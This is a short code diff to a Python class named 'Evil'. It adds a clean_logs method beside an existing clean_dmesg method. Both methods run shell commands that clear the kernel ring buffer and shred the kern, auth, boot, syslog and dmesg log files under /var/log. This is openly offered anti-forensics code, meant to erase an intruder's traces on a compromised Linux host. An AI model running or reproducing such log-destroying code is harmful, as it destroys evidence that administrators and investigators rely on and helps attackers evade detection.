@@ -24,3 +24,9 @@ class Evil:
     def clean_dmesg(self):
         subprocess.call("dmesg -C", shell = True)
         subprocess.call("shred -z -n 5 /var/log/dmesg*", shell = True)
+
+    def clean_logs(self):
+        subprocess.call("shred -z -n 5 /var/log/kern*", shell = True)
+        subprocess.call("shred -z -n 5 /var/log/auth*", shell = True)
+        subprocess.call("shred -z -n 5 /var/log/boot*", shell = True)
+        subprocess.call("shred -z -n 5 /var/log/syslog*", shell = True)
